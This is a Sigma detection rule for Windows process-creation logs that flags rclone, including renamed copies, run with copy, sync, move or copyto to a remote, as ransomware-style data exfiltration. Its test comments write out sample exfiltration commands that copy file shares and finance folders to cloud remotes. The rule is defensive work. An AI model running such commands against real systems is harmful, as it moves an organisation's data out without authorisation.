title: Rclone Execution With Bulk Transfer Arguments
id: ce5d3957-dc88-470f-9c36-68974f357d24
status: experimental
description: Detects rclone, by name or by its original file name when renamed, run with copy, sync or move to a remote. Ransomware operators use it to exfiltrate data to cloud storage before encrypting.
references:
  - https://attack.mitre.org/techniques/T1567/002/
  - https://rclone.org/commands/
author: MarcBernaldo
date: 2026-11-07
tags:
  - attack.exfiltration
  - attack.t1567.002
  - attack.t1048
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\rclone.exe'
    - OriginalFileName: 'rclone.exe'
  selection_cmd:
    CommandLine|contains:
      - ' copy '
      - ' sync '
      - ' move '
      - ' copyto '
  condition: selection_img and selection_cmd
falsepositives:
  - Backup jobs that use rclone (usually a scheduled task with a fixed config and destination)
level: high
# OriginalFileName exists only in Sysmon events; on Security 4688 and in memory
# the rule relies on the image name.
# test-match: Image="C:\Users\jdoe\Downloads\rclone.exe" CommandLine="rclone.exe copy C:\Shares remote:bucket --transfers 16"
# test-match: Image="C:\ProgramData\rc\rclone.exe" CommandLine="rclone.exe sync D:\Finance mega:dump --ignore-existing"
# test-nomatch: Image="C:\Users\jdoe\Downloads\rclone.exe" CommandLine="rclone.exe version"
